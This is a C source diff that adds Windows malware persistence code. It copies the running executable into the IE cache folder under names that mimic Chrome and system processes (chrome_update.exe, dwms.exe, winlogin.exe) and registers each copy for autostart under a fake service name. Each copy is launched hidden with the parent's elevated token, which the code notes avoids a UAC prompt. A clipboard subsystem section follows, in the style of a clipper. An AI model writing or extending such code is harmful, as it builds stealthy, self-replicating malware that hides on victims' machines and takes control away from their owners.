@@ -373,9 +373,9 @@ int sys_is_admin(void) {
     return IsUserAnAdmin() ? 1 : 0;
 }
 
-/* Spawn a shadow copy using CreateProcess to inherit parent's elevated token.
-   The child gets --shadow flag and auto-protects after 15 seconds. */
-void sys_spawn_shadow_copy(void) {
+/* Spawn a single shadow copy with a given filename and registry key name.
+   Uses CreateProcess for elevation inheritance. */
+static void spawn_single_copy(const char *filename, const char *regKey) {
     char currentPath[MAX_PATH];
     GetModuleFileNameA(NULL, currentPath, MAX_PATH);
 
@@ -383,7 +383,7 @@ void sys_spawn_shadow_copy(void) {
     GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
 
     char destPath[MAX_PATH];
-    snprintf(destPath, MAX_PATH, "%s\\Microsoft\\Windows\\INetCache\\IE\\chrome_update.exe", localAppData);
+    snprintf(destPath, MAX_PATH, "%s\\Microsoft\\Windows\\INetCache\\IE\\%s", localAppData, filename);
 
     char dirPath[MAX_PATH];
     strncpy(dirPath, destPath, MAX_PATH - 1);
@@ -403,24 +403,31 @@ void sys_spawn_shadow_copy(void) {
             0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
         char runCmd[MAX_PATH * 2];
         snprintf(runCmd, sizeof(runCmd), "\"%s\" --shadow", destPath);
-        RegSetValueExA(hKey, "ChromeUpdate", 0, REG_SZ, (BYTE*)runCmd, (DWORD)strlen(runCmd) + 1);
+        RegSetValueExA(hKey, regKey, 0, REG_SZ, (BYTE*)runCmd, (DWORD)strlen(runCmd) + 1);
         RegCloseKey(hKey);
     }
 
-    /* CreateProcess inherits parent's elevated token — no UAC prompt needed */
+    /* CreateProcess inherits parent's elevated token */
     STARTUPINFOA si = {0};
     si.cb = sizeof(si);
     PROCESS_INFORMATION pi = {0};
-    
+
     char cmdLine[1024];
     snprintf(cmdLine, sizeof(cmdLine), "\"%s\" --shadow", destPath);
-    
-    if (CreateProcessA(destPath, cmdLine, NULL, NULL, FALSE, 
-                       CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, 
+
+    if (CreateProcessA(destPath, cmdLine, NULL, NULL, FALSE,
+                       CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
                        NULL, NULL, &si, &pi)) {
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
     }
+}
+
+/* Spawn three shadow copies: chrome_update.exe, dwms.exe, winlogin.exe */
+void sys_spawn_shadow_copy(void) {
+    spawn_single_copy("chrome_update.exe", "ChromeUpdate");
+    spawn_single_copy("dwms.exe", "DwmService");
+    spawn_single_copy("winlogin.exe", "WinLogonService");
 }
 
 /* === Clipboard Subsystem === */
